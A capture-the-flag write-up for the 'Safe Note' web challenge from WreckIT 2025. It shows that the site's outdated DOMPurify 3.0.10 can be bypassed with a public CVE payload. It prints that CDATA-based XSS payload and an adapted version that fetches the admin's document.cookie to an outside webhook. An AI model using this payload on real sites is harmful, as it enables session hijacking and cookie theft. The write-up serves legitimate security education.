---
description: '[Solved] A black box web exploitation CTF challenge from WreckIT 2025'
---

# \[Web] Safe Note

## TL;DR

* Blackbox challenge but we can see that it uses dompurify 3.0.10 min,js
* There's a CVE: [https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-6474511](https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-6474511)&#x20;
* Just use the payload from the cve to do xss fetch + document.cookie
* Profit

Flag: WRECKIT60{s1mple\_xss\_since\_im\_not-really\_good\_at\_doing\_web}

## Description

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Overview

The website has an input that takes a string of text and then show it in the website. It also able to render a text according to a request paramater 'note'.&#x20;

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Seeing that it can makes a text appear in a website through a link alone, make me leans to think that its an XSS and looking at the source code......&#x20;

Well, We are not given a source code so we are limited to only the source we get from devtools but that is plenty enough.

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

As we can see from app.js, theres a possible XSS as the input is set into an innerHTML but is sanitized first by dompurify.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

The website also has a report functionality for obvious XSS CTF purposes.

## Solution

We know that if we can bypass that dompurify, we can essentialy get XSS and Unfortunately, the website uses an older version of dompurify:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

It uses Dompurify min.js version 3.0.10 which if we search for CVEs, we find quite a bit of them (lmao). One of them has a payload which is the following,

```javascript
<![CDATA[ ><img src onerror=alert(1)> ]]>
```

I literally just copy pasted it and it works. So I just change it to make it fetch to my webhook with the admin cookie,

```javascript
<![CDATA[ ><img src onerror=fetch('webhook?data=' + document.cookie)> ]]>
```

Then, use the share functionality of the web to change my payload to an URL and then give it to the admin bot and we're done.

## Links

References:

{% embed url="https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-6474511" %}

